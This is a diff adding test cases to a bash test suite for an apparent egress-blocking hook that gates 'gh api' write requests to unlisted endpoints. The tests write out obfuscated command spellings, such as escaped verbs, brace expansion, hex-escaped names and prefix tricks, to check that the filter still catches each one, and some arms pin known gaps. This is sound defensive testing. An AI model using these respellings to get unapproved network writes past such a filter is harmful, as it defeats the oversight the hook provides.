+        e007_d_fail "$2${E007_N_K}: $1 at ${kb} KB in ${loc} costs the whole hook within ${E007_N_BOUND} times its neutral twin, inside the budget, and both are allowed — measured ratio ${E007_N_RATIO}, bound ${E007_N_BOUND}" \
+          "\"stopped\" is the watchdog ending a run at the budget; a ratio within the bound fails only on a refusal"
+      fi
+    done
+  done
+}
+e007_ng_timed "a brace group whose words share a long prefix" "AC-E007-NG" bracepre pre
+e007_ng_timed "a brace group whose words share a long suffix" "AC-E007-NG" bracesuf post
+e007_n_ctl "AC-E007-NG-CTL" "$E007_NG_NB" bracepre 10 en_US.UTF-8 "the brace step without its bound"
+
+# ---- AC-CPH-E* (#8314, DT pass 7): the hook clears the canonicalizer's long shapes inside the budget ----
+#
+# The shared canonicalizer's three changed sites — the basename step of a prefix word, the option-cluster
+# walk and the split-string scan — each read their token once, so this hook, which canonicalizes every Bash
+# command, clears one long command word, a long option cluster and a long split string in its short and
+# long spelling inside the budget at 10, 20, 40 and 80 KB in en_US.UTF-8 and C, and allows each. The arms
+# that see each site's cost apart from the rest of the hook are the false-positive control's AC-CP-L arms,
+# on the canonicalizer alone, beside their sensitivity copy.
+E007_CPH_R="${E007_W_BASE}/cph"
+/bin/mkdir -p "$E007_CPH_R"
+# e007_cph_cmd <shape> <bytes> <file> — the head, as many units as fit, then the tail, built by doubling.
+e007_cph_cmd() {
+  local h u t
+  case "$1" in
+    word)    h='';                     u='a'; t='' ;;
+    cluster) h='sudo -';               u='b'; t=' q' ;;
+    split)   h='env -S-';              u='b'; t=' q' ;;
+    lsplit)  h='env --split-string=-'; u='b'; t=' q' ;;
+  esac
+  H="$h" U="$u" T="$t" LC_ALL=C /usr/bin/awk -v n="$2" 'BEGIN { h = ENVIRON["H"]; u = ENVIRON["U"]; t = ENVIRON["T"]
+    m = n - length(h) - length(t); r = u; while (length(r) < m) r = r r
+    printf "%s", h substr(r, 1, m) t }' > "$3"
+}
+_cph_n=0
+for _cph_shape in word cluster split lsplit; do
+  for _cph_kb in 10 20 40 80; do e007_cph_cmd "$_cph_shape" $(( _cph_kb * 1024 )) "${E007_CPH_R}/${_cph_shape}-${_cph_kb}.cmd"; done
+  for _cph_loc in en_US.UTF-8 C; do
+    for _cph_kb in 10 20 40 80; do
+      _cph_n=$(( _cph_n + 1 ))
+      e007_t_timed "$E007_W_S" "$_cph_loc" "${E007_CPH_R}/${_cph_shape}-${_cph_kb}.cmd" "$E007_T_LIMIT"
+      if [ "$E007_T_DS" != -1 ] && [ "$E007_T_EXIT" = 0 ]; then
+        e007_d_pass "AC-CPH-E${_cph_n}: the long ${_cph_shape} shape at ${_cph_kb} KB in ${_cph_loc} clears the whole hook within the budget and is allowed"
+      else
+        e007_d_fail "AC-CPH-E${_cph_n}: the long ${_cph_shape} shape in ${_cph_loc} clears the hook inside the budget and is allowed — measured ratio $(e007_t_ratio "${E007_T_DS}" "${E007_T_LIMIT}") of the budget, bound 1.00" \
+          "\"stopped\" is the watchdog ending the run at the budget; exit=${E007_T_EXIT} (want 0)"
+      fi
+    done
+  done
+done
+
+# ---- Behind a prefix: each respelling reaches the record its plain twin gets ----
+e007_w_pair "AC-E007-SP-W4: \\env -u X gh api -X POST <unlisted> — an escaped prefix word — is located behind the option's argument and recorded" \
+  "\\env -u X gh api -X POST ${E007_W_NO}"
+e007_w_pair "AC-E007-SP-W5: env -u X {gh,api} -X POST <unlisted> — a brace-expanded verb behind a prefix option — is located and recorded" \
+  "env -u X {gh,api} -X POST ${E007_W_NO}"
+e007_w_pair "AC-E007-SP-W6: env -u X GH api -X POST <unlisted> — a case-variant verb behind a prefix option — is located and recorded" \
+  "env -u X GH api -X POST ${E007_W_NO}"
+
+# ---- The counter: a respelled invocation never advances the first-invocation counter ----
+e007_sp_arm "AC-E007-SP-K1: \\gh api <allowlisted> ; gh api -X POST <unlisted> — a respelled read before a plain write — leaves the write refused on day one; if respelled invocations advanced the counter, it would move to the record" \
+  "\\gh api ${E007_W_OK} ; ${E007_SP_PLAIN}" "$E007_W_S" 2 1 0 "$E007_SP_RC" 0 0 1
+e007_sp_arm "AC-E007-SP-K2: gh api <allowlisted> ; \\gh api -X POST <unlisted> — a respelled write after a plain read — is recorded as its plain twin is, and refused with the phase forced" \
+  "gh api ${E007_W_OK} ; \\gh api -X POST ${E007_W_NO}" "$E007_W_S" 0 0 1 "$E007_W_E" 2 1 -
+e007_sp_arm "AC-E007-SP-K3: \\gh api <allowlisted> ; \\gh api -X POST <unlisted> — a respelled write after a respelled read — is recorded as its plain twin is" \
+  "\\gh api ${E007_W_OK} ; \\gh api -X POST ${E007_W_NO}" "$E007_W_S" 0 0 1
+e007_sp_arm "AC-E007-SP-K4: gh \\⏎api <allowlisted> ; gh api -X POST <unlisted> — a joined read before a plain write — leaves the write refused on day one; if respelled invocations advanced the counter, it would move to the record" \
+  "gh \\${E007_SP_NL}api ${E007_W_OK} ; ${E007_SP_PLAIN}" "$E007_W_S" 2 1 0 "$E007_SP_RC" 0 0 1
+
+# ---- The unparseable branch reads the same spellings, at the shipped test's positions only ----
+e007_sp_arm "AC-E007-SP-U0: the plain head write followed by an untokenizable construct is refused by the shipped test, with and without the second reader (the control)" \
+  "${E007_SP_PLAIN}${E007_SP_ESQ}" "$E007_W_S" 2 1 0 "$E007_SP_NU" 2 1 0
+e007_sp_arm "AC-E007-SP-U1: a leading redirection, then the write, in an untokenizable command, is refused; the shipped test alone admits it" \
+  ">/dev/null ${E007_SP_PLAIN}${E007_SP_ESQ}" "$E007_W_S" 2 1 0 "$E007_SP_NU" 0 0 0
+e007_sp_arm "AC-E007-SP-U2: a continuation between the verb and its subcommand, in an untokenizable command, is refused; the shipped test alone admits it" \
+  "gh \\${E007_SP_NL}api -X POST ${E007_W_NO}${E007_SP_ESQ}" "$E007_W_S" 2 1 0 "$E007_SP_NU" 0 0 0
+e007_sp_arm "AC-E007-SP-U3: an escaped verb, in an untokenizable command, is refused; the shipped test alone admits it" \
+  "\\gh api -X POST ${E007_W_NO}${E007_SP_ESQ}" "$E007_W_S" 2 1 0 "$E007_SP_NU" 0 0 0
+e007_sp_arm "AC-E007-SP-U4: a brace-expanded verb, in an untokenizable command, is refused; the shipped test alone admits it" \
+  "{gh,api} -X POST ${E007_W_NO}${E007_SP_ESQ}" "$E007_W_S" 2 1 0 "$E007_SP_NU" 0 0 0
+e007_sp_arm "AC-E007-SP-U5: an ANSI-C verb with a hex escape, in an untokenizable command, is refused; the shipped test alone admits it" \
+  "\$'\\x67h' api -X POST ${E007_W_NO}${E007_SP_ESQ}" "$E007_W_S" 2 1 0 "$E007_SP_NU" 0 0 0
+e007_sp_arm "AC-E007-SP-U6: a case-variant verb, in an untokenizable command, is refused; the shipped test alone admits it" \
+  "GH api -X POST ${E007_W_NO}${E007_SP_ESQ}" "$E007_W_S" 2 1 0 "$E007_SP_NU" 0 0 0
+e007_sp_arm "AC-E007-SP-U7: an escaped verb's read, in an untokenizable command, is refused as its plain twin is; the shipped test alone admits it" \
+  "\\gh api ${E007_W_OK}${E007_SP_ESQ}" "$E007_W_S" 2 1 0 "$E007_SP_NU" 0 0 0
+e007_sp_arm "AC-E007-SP-U8: an escaped verb behind env, in an untokenizable command, is allowed as its plain twin is — a prefix word is never passed over there (a near miss)" \
+  "env \\gh api -X POST ${E007_W_NO}${E007_SP_ESQ}" "$E007_W_S" 0 0 0
+e007_sp_arm "AC-E007-SP-U9: an escaped verb inside a subshell, in an untokenizable command, is allowed as its plain twin is (a near miss)" \
+  "( \\gh api -X POST ${E007_W_NO} )${E007_SP_ESQ}" "$E007_W_S" 0 0 0
+e007_sp_arm "AC-E007-SP-U10: env -u X \\⏎ then an escaped verb on the next physical line, in an untokenizable command, is refused at that line's head; the shipped test alone admits it" \
+  "env -u X \\${E007_SP_NL}\\gh api -X POST ${E007_W_NO}${E007_SP_ESQ}" "$E007_W_S" 2 1 0 "$E007_SP_NU" 0 0 0
+_sp_why=""
+e007_w_run "$E007_SP_LC" "\\gh api -X POST ${E007_W_NO}${E007_SP_ESQ}"
+{ [ "$E007_D_EXIT" = 0 ] && [ "$E007_D_BLK" = 0 ] && [ "$E007_D_WRN" = 0 ]; } || _sp_why="${_sp_why} [lc respelled] exit=${E007_D_EXIT} refusals+${E007_D_BLK} rows+${E007_D_WRN}, want 0 +0 +0;"
+e007_w_run "$E007_SP_LC" "${E007_SP_PLAIN}${E007_SP_ESQ}"
+{ [ "$E007_D_EXIT" = 2 ] && [ "$E007_D_BLK" = 1 ] && /usr/bin/grep -q 'BLOCK-EGRESS-007' <<<"$E007_D_ERR"; } || _sp_why="${_sp_why} [lc plain] exit=${E007_D_EXIT} refusals+${E007_D_BLK}, want 2 +1;"
+if [ -z "$_sp_why" ]; then
+  e007_d_pass "AC-E007-SP-U11: above a lowered parse cap the second reader locates nothing — an escaped verb in an untokenizable command is allowed — while the plain spelling is still refused (the declared cap residual, pinned)"
+else
+  e007_d_fail "AC-E007-SP-U11: above a lowered cap the respelled form is not located and the plain form is still refused" "$_sp_why"
+fi
+
+# ---- The ANSI-C terminator guard: no command crosses the scanner's parse boundary ----
+e007_sp_arm "AC-E007-SP-A2: echo \$'it\\'s' ; gh api <allowlisted> — an ANSI-C string carrying an escaped quote — keeps today's unparseable refusal; a span ended at the first unescaped quote would make it a tokenizable read" \
+  "echo \$'it\\'s' ; gh api ${E007_W_OK}" "$E007_W_S" 2 1 0 "$E007_SP_AX" 0 0 0
+e007_sp_arm "AC-E007-SP-A3: an implicit-POST write to <unlisted> whose field value is that string keeps today's refusal; unguarded, it would move to the record" \
+  "gh api ${E007_W_NO} -f body=\$'it\\'s'" "$E007_W_S" 2 1 0 "$E007_SP_AX" 0 0 1
+e007_sp_arm "AC-E007-SP-A4: a read of <allowlisted>, then an explicit write to <unlisted> carrying that string, keeps today's refusal; unguarded, it would move to the record" \
+  "gh api ${E007_W_OK} ; ${E007_SP_PLAIN} -f body=\$'it\\'s'" "$E007_W_S" 2 1 0 "$E007_SP_AX" 0 0 1
+e007_sp_arm "AC-E007-SP-A5: a read of <allowlisted>, then that write behind env, keeps today's refusal; unguarded, it would move to the record" \
+  "gh api ${E007_W_OK} ; env ${E007_SP_PLAIN} -f body=\$'it\\'s'" "$E007_W_S" 2 1 0 "$E007_SP_AX" 0 0 1
+
+# ---- Class 10: a method or field flag in its attached or clustered short form ----
+e007_sp_arm "AC-E007-SP-M1: gh api -XPOST <unlisted> — the method attached to its flag — is refused on day one, and read as a read without the cluster reader" \
+  "gh api -XPOST ${E007_W_NO}" "$E007_W_S" 2 1 0 "$E007_SP_NS" 0 0 0
+e007_sp_arm "AC-E007-SP-M2: gh api -X=POST <unlisted> — the method attached with = — is refused on day one, and read as a read without the cluster reader" \
+  "gh api -X=POST ${E007_W_NO}" "$E007_W_S" 2 1 0 "$E007_SP_NS" 0 0 0
+e007_sp_arm "AC-E007-SP-M3: gh api -iX POST <unlisted> — the method flag clustered after -i, its value the next word — is refused on day one, and read as a read of the path POST without the cluster reader" \
+  "gh api -iX POST ${E007_W_NO}" "$E007_W_S" 2 1 0 "$E007_SP_NS" 0 0 0
+e007_sp_arm "AC-E007-SP-M4: gh api -iXPOST <unlisted> — clustered and attached — is refused on day one, and read as a read without the cluster reader" \
+  "gh api -iXPOST ${E007_W_NO}" "$E007_W_S" 2 1 0 "$E007_SP_NS" 0 0 0
+e007_sp_arm "AC-E007-SP-M5: gh api <unlisted> -fbody=x — a field flag with its value attached — is an implicit POST, recorded as its plain twin is, and read as a read without the cluster reader" \
+  "gh api ${E007_W_NO} -fbody=x" "$E007_W_S" 0 0 1 "$E007_SP_NS" 0 0 0
+e007_sp_arm "AC-E007-SP-M6: gh api -XGET <unlisted> — an attached read method — stays a read (a near miss); with every invocation read as a write and the phase forced, it is refused" \
+  "gh api -XGET ${E007_W_NO}" "$E007_W_S" 0 0 0 "$E007_W_WE" 2 1 -
+e007_sp_arm "AC-E007-SP-M7: gh api -iH accept:x <allowlisted> -X POST — a clustered header flag's separate value — is no longer taken for the path, so the allowlisted write is allowed (a declared precision improvement); without the cluster reader the header value is the path, refused" \
+  "gh api -iH accept:x ${E007_W_OK} -X POST" "$E007_W_S" 0 0 0 "$E007_SP_NS" 2 1 0
+e007_sp_arm "AC-E007-SP-M8: gh api -XGET <unlisted> -f q=1 — an attached GET with a field flag — is a GET, as gh sends it, so no write is recorded (a declared precision improvement); without the cluster reader it is an implicit POST, recorded" \
+  "gh api -XGET ${E007_W_NO} -f q=1" "$E007_W_S" 0 0 0 "$E007_SP_NS" 0 0 1
+
+# ---- The quoted-operator stand-ins: a quoted < or > is content, never a redirection ----
+e007_sp_arm "AC-E007-SP-Q1: gh api -X POST '>x' <allowlisted> — a quoted word that begins with > — keeps today's refusal, the word read as the path; read as a redirection it would be dropped and the write allowed" \
+  "gh api -X POST '>x' ${E007_W_OK}" "$E007_W_S" 2 1 0 "$E007_SP_NQ" 0 0 0
+e007_sp_arm "AC-E007-SP-Q2: gh api -X POST -f '<x>=1' <allowlisted> — a quoted field that begins with < — keeps today's allow; read as a redirection the field flag would take the path and the write would be refused" \
+  "gh api -X POST -f '<x>=1' ${E007_W_OK}" "$E007_W_S" 0 0 0 "$E007_SP_NQ" 2 1 0
+
+# ---- Redirection-grammar parity: what each walk steps over, asserted rather than silent ----
+# One row per redirection form, `egress|canon|d022|form`: whether the egress walk steps over the
+# form before the verb (asserted through the shipped copy), whether the shared canonicalizer does
+# (asserted through its awk, the form before a neutral word), and the script-execution walk, which
+# steps over none — declared, owned by its own card, and not read here. An arm fails on an
+# undeclared difference and on a declared difference that no longer exists.
+E007_RDR_DECL='steps|steps|none|>/tmp/es.f
+steps|steps|none|> /tmp/es.f
+steps|steps|none|>>/tmp/es.f
+steps|steps|none|>> /tmp/es.f
+steps|steps|none|2>/tmp/es.f
+steps|steps|none|2> /tmp/es.f
+steps|none|none|2>&1
+steps|none|none|>&2
+steps|steps|none|</tmp/es.f
+steps|steps|none|< /tmp/es.f
+steps|steps|none|<<<x
+steps|steps|none|<>/tmp/es.f
+steps|none|none|>|/tmp/es.f
+steps|steps|none|&>/tmp/es.f
+steps|steps|none|&>>/tmp/es.f
+steps|none|none|{fd}>/tmp/es.f'
+_sp_eg_bad=""; _sp_ca_bad=""; _sp_n=0
+while IFS='|' read -r _sp_eg _sp_ca _sp_dd _sp_form; do
+  [ -n "$_sp_form" ] || continue
+  _sp_n=$((_sp_n + 1))
+  e007_w_run "$E007_W_S" "${_sp_form} ${E007_SP_PLAIN}"
+  if [ "$E007_D_EXIT" = 2 ]; then _sp_obs=steps; else _sp_obs=none; fi
+  [ "$_sp_obs" = "$_sp_eg" ] || _sp_eg_bad="${_sp_eg_bad} [${_sp_form}] observed ${_sp_obs}, declared ${_sp_eg};"
+  _sp_ca_out="$(/usr/bin/printf '%s' "${_sp_form} true" | /usr/bin/awk -f "${E007_D_HOOK_SRC}/lib/command-position.awk" 2>/dev/null)"
+  case "$_sp_ca_out" in *"; true"*) _sp_obs=steps ;; *) _sp_obs=none ;; esac
+  [ "$_sp_obs" = "$_sp_ca" ] || _sp_ca_bad="${_sp_ca_bad} [${_sp_form}] observed ${_sp_obs}, declared ${_sp_ca};"
+done <<<"$E007_RDR_DECL"
+if [ "$_sp_n" -eq 16 ] && [ -z "$_sp_eg_bad" ]; then
+  e007_d_pass "AC-E007-RDRPARITY-egress: the egress walk steps over all ${_sp_n} declared redirection forms before the verb"
+else
+  e007_d_fail "AC-E007-RDRPARITY-egress: the egress walk's redirection handling matches its declaration" "rows ${_sp_n} (want 16);${_sp_eg_bad}"
+fi
+if [ "$_sp_n" -eq 16 ] && [ -z "$_sp_ca_bad" ]; then
+  e007_d_pass "AC-E007-RDRPARITY-canon: the shared canonicalizer's redirection handling matches its declared column on all ${_sp_n} forms"
+else
+  e007_d_fail "AC-E007-RDRPARITY-canon: the shared canonicalizer's redirection handling matches its declared column" "rows ${_sp_n} (want 16);${_sp_ca_bad}"
+fi
+
+# ---- The append form of a prefix assignment (#8315, the walk-fix pass) ----
+# bash and zsh read NAME+=value, the append form of a prefix assignment, as an assignment word, as
+# they read NAME=value. This walk's predicate recognized only the second, so it took an append-form
+# word for an unlisted leading word, which the rule treats as the command, and a write behind it was
+# admitted with no record. The walk now steps over the form with the skip and the position flag a
+# NAME=value word gets (the `append: walk` line), so a write behind it takes its NAME=value twin's
+# rung: a widening, recorded at the shipped phase. An append whose value opens an array still ends
+# the walk (the `append: array` line); `(` already opens a segment here, so this walk never meets
+# such a token, and the line is kept so the predicate stays spelled as BLOCK-DESTRUCTIVE-022's
+# (AP-PARITY). One addition the twin does not carry: an invocation the walk reaches only behind the
+# form advances neither first-invocation counter (the `append: hold` line), as a look-ahead hit does
+# not, because the shipped hook never reached it -- so no later write at the head of a segment
+# leaves the day-one refusal it has today, and a read-then-write command spelled with the form is
+# the stricter of the two spellings. A quoted append-form word is read with its quote marks dropped,
+# as every word here is, so it is recorded as its quoted NAME=value twin is. And a form whose value
+# ends in `gh`, ahead of the word `api`, is the assignment it is: the shell runs `api`, so the write
+# the reverted walk refused is not there (the declared precision class).
+# Copies: ap the hook with the three marked lines reverted (the walk before this pass) · ah the hook
+# without the hold. A limb reads exit/refusals/rows, as the SP arms read them.
+E007_W_X_APWALK='/  # append: walk$/s/_+]\*|\*+?\*)/_]*)/'
+E007_W_X_APARRAY='/  # append: array$/d'
+E007_W_X_APHOLD='/  # append: hold$/d'
+E007_AP_R="${E007_W_BASE}/ap"; e007_w_copy "$E007_AP_R" "$E007_W_X_APWALK" "$E007_W_X_APARRAY" "$E007_W_X_APHOLD"
+E007_AP_H="${E007_W_BASE}/ah"; e007_w_copy "$E007_AP_H" "$E007_W_X_APHOLD"
+e007_w_shape "AC-E007-AP0-R: the copy with the append form reverted differs in three lines out and one in, parses, and still denies -001" "$E007_AP_R" 3 1
+e007_w_shape "AC-E007-AP0-H: the copy without the hold differs in one line taken out, parses, and still denies -001" "$E007_AP_H" 1 0
+E007_AP_HEAD="shadow|not-allowlisted|${E007_W_NO}|-"
+
+e007_sp_rowarm "AC-E007-AP-CTL: FOO=1 gh api -X POST <unlisted> — the NAME=value control — is recorded by the head walk, and so on the reverted copy" \
+  "FOO=1 ${E007_SP_PLAIN}" "$E007_AP_HEAD" "$E007_AP_R" 0 0 1
+e007_sp_rowarm "AC-E007-AP-1: FOO+=1 gh api -X POST <unlisted> — the append form — is recorded by the head walk as its NAME=value twin is, refused with the phase forced, and allowed with no record on the reverted copy" \
+  "FOO+=1 ${E007_SP_PLAIN}" "$E007_AP_HEAD" "$E007_W_E" 2 1 - "$E007_AP_R" 0 0 0
+e007_sp_rowarm "AC-E007-AP-2: true; FOO+=1 gh api -X POST <unlisted> — the form opening a later segment — is recorded, and allowed with no record on the reverted copy" \
+  "true; FOO+=1 ${E007_SP_PLAIN}" "$E007_AP_HEAD" "$E007_AP_R" 0 0 0
+e007_sp_rowarm "AC-E007-AP-3: FOO+=1 env -u X gh api -X POST <unlisted> — the form ahead of a prefix command — is located and recorded, and allowed with no record on the reverted copy" \
+  "FOO+=1 env -u X ${E007_SP_PLAIN}" "shadow|not-allowlisted|${E007_W_NO}|look-ahead" "$E007_AP_R" 0 0 0
+e007_sp_rowarm "AC-E007-AP-4: env FOO+=1 gh api -X POST <unlisted> — the form behind a prefix word — is recorded by the head walk where the reverted copy records it through the look-ahead: the verdict does not move, the row moves to the head-walk population" \
+  "env FOO+=1 ${E007_SP_PLAIN}" "$E007_AP_HEAD" "$E007_AP_R" 0 0 1
+
+# The counter: an invocation reached behind the form advances neither first-invocation counter.
+e007_sp_arm "AC-E007-AP-K1: FOO+=1 gh api <allowlisted> ; gh api -X POST <unlisted> — a read behind the form before a plain write — leaves the write refused on day one, as before this pass; without the hold the read would count and the write would move to the record" \
+  "FOO+=1 gh api ${E007_W_OK} ; ${E007_SP_PLAIN}" "$E007_W_S" 2 1 0 "$E007_AP_R" 2 1 0 "$E007_AP_H" 0 0 1
+e007_sp_arm "AC-E007-AP-K2: FOO+=1 gh api <allowlisted> ; \\gh api -X POST <unlisted> — the same before a respelled write — leaves it refused on day one; without the hold it would move to the record" \
+  "FOO+=1 gh api ${E007_W_OK} ; \\gh api -X POST ${E007_W_NO}" "$E007_W_S" 2 1 0 "$E007_AP_R" 2 1 0 "$E007_AP_H" 0 0 1
+e007_sp_arm "AC-E007-AP-K3: FOO=1 gh api <allowlisted> ; gh api -X POST <unlisted> — the NAME=value twin — records the write, its read counted, on both copies: the append form is the stricter spelling (the declared asymmetry)" \
+  "FOO=1 gh api ${E007_W_OK} ; ${E007_SP_PLAIN}" "$E007_W_S" 0 0 1 "$E007_AP_R" 0 0 1
+
+# A quoted append-form word, beside its quoted NAME=value twin.
+e007_sp_rowarm "AC-E007-AP-Q: \"FOO+=1\" gh api -X POST <unlisted> — a quoted append-form word — is recorded as its quoted NAME=value twin is, because this rule's scanner drops quote marks before a word is read; allowed with no record on the reverted copy" \
+  "\"FOO+=1\" ${E007_SP_PLAIN}" "$E007_AP_HEAD" "$E007_AP_R" 0 0 0
+e007_sp_rowarm "AC-E007-AP-Q-CTL: \"FOO=1\" gh api -X POST <unlisted> — the quoted NAME=value twin — is recorded, and so on the reverted copy" \
+  "\"FOO=1\" ${E007_SP_PLAIN}" "$E007_AP_HEAD" "$E007_AP_R" 0 0 1
+
+# The declared precision class, beside its NAME=value spelling.
+e007_sp_arm "AC-E007-AP-PREC: FOO+=/opt/homebrew/bin/gh api -X POST <unlisted> — an append whose value ends in gh, ahead of the word api — is allowed with no record as its NAME=value spelling is, since the shell runs api and never gh; the reverted copy read the value as the verb and refused it" \
+  "FOO+=/opt/homebrew/bin/gh api -X POST ${E007_W_NO}" "$E007_W_S" 0 0 0 "$E007_AP_R" 2 1 0
+e007_sp_arm "AC-E007-AP-PREC-CTL: FOO=/opt/homebrew/bin/gh api -X POST <unlisted> — the NAME=value spelling — is allowed with no record on both copies" \
+  "FOO=/opt/homebrew/bin/gh api -X POST ${E007_W_NO}" "$E007_W_S" 0 0 0 "$E007_AP_R" 0 0 0
+
+# Near misses: each stays allowed with no record on both copies, and the ungated, phase-forced
+# locator refuses it, so the arm can fail.
+e007_sp_arm "AC-E007-AP-NEAR-1: echo FOO+=1 gh api -X POST <unlisted> — the form after the command word — stays allowed with no record; with the locator ungated and the phase forced it is refused" \
+  "echo FOO+=1 ${E007_SP_PLAIN}" "$E007_W_S" 0 0 0 "$E007_AP_R" 0 0 0 "$E007_W_UE" 2 1 -
+e007_sp_arm "AC-E007-AP-NEAR-2: a-b+=1 gh api -X POST <unlisted> — an invalid name before the append operator — stays allowed with no record; with the locator ungated and the phase forced it is refused" \
+  "a-b+=1 ${E007_SP_PLAIN}" "$E007_W_S" 0 0 0 "$E007_AP_R" 0 0 0 "$E007_W_UE" 2 1 -
+e007_sp_arm "AC-E007-AP-NEAR-3: FOO++=1 gh api -X POST <unlisted> — a doubled plus, not the append operator — stays allowed with no record; with the locator ungated and the phase forced it is refused" \
+  "FOO++=1 ${E007_SP_PLAIN}" "$E007_W_S" 0 0 0 "$E007_AP_R" 0 0 0 "$E007_W_UE" 2 1 -
+
+# The unparseable branch: its readers pass over no assignment in either spelling, by design.
+e007_sp_arm "AC-E007-AP-U: FOO+=1 gh api -X POST <unlisted>, in a command the scanner cannot tokenize, stays allowed with no record as its NAME=value twin is (corpus row ES118 and arm SP-U0 are the twin and the plain head's refusal)" \
+  "FOO+=1 ${E007_SP_PLAIN}${E007_SP_ESQ}" "$E007_W_S" 0 0 0 "$E007_AP_R" 0 0 0
+
+# AC-E007-AP-PARITY — the assignment-prefix predicate is spelled as BLOCK-DESTRUCTIVE-022's, as the
+# hook's own comment says: the lines from `case "${<token>%%=*}" in` to its `esac`, in this walk
+# and in that rule's command-position walk, read with leading blanks and a trailing marker taken off
+# and each walk's own token variable written TOK, are the same lines. Both readings must find the
+# predicate (three lines at least), and the sensitivity limb is this walk's reading with one word
+# changed, which must compare as different.
+e007_ap_pred() { # $1 file  $2 token variable -> the predicate's lines, normalized
+  /usr/bin/awk -v v="$2" '
+    function rep(s, a, b,   i, out) {
+      out = ""
+      while ((i = index(s, a)) > 0) { out = out substr(s, 1, i - 1) b; s = substr(s, i + length(a)) }
+      return out s
+    }
+    index($0, "case \"${" v "%%=*}\" in") { on = 1 }
+    on {
+      line = $0
+      sub(/^[ \t]+/, "", line)
+      sub(/[ \t][ \t]+# [A-Za-z].*$/, "", line)
+      print rep(line, v, "TOK")
+      if (line == "esac") exit
+    }
+  ' "$1"
+}
+_ap_eg="$(e007_ap_pred "${E007_D_HOOK_SRC}/block-egress.sh" egress_raw)"
+_ap_dd="$(e007_ap_pred "${E007_D_HOOK_SRC}/block-destructive.sh" script_ptok)"
+_ap_mu="${_ap_eg/ break ;;/ brake ;;}"
+_ap_why=""
+[ "$(/usr/bin/awk 'END { print NR }' <<<"$_ap_eg")" -ge 3 ] || _ap_why="${_ap_why} the egress predicate was not found;"
+[ "$(/usr/bin/awk 'END { print NR }' <<<"$_ap_dd")" -ge 3 ] || _ap_why="${_ap_why} the BLOCK-DESTRUCTIVE-022 predicate was not found;"
+[ "$_ap_eg" = "$_ap_dd" ] || _ap_why="${_ap_why} the two predicates differ;"
+[ "$_ap_mu" != "$_ap_dd" ] || _ap_why="${_ap_why} sensitivity: a changed word reads as the same predicate;"
+if [ -z "$_ap_why" ]; then
+  e007_d_pass "AC-E007-AP-PARITY: this walk's assignment-prefix predicate is spelled as BLOCK-DESTRUCTIVE-022's, line for line, and a one-word change reads as different"
+else
+  e007_d_fail "AC-E007-AP-PARITY: this walk's assignment-prefix predicate is spelled as BLOCK-DESTRUCTIVE-022's" "${_ap_why} egress=[${_ap_eg}] d022=[${_ap_dd}]"
+fi
 
 # =====================================================================
 # EGRESSCORPUS-* — the tracked payload differential for this rule's walk
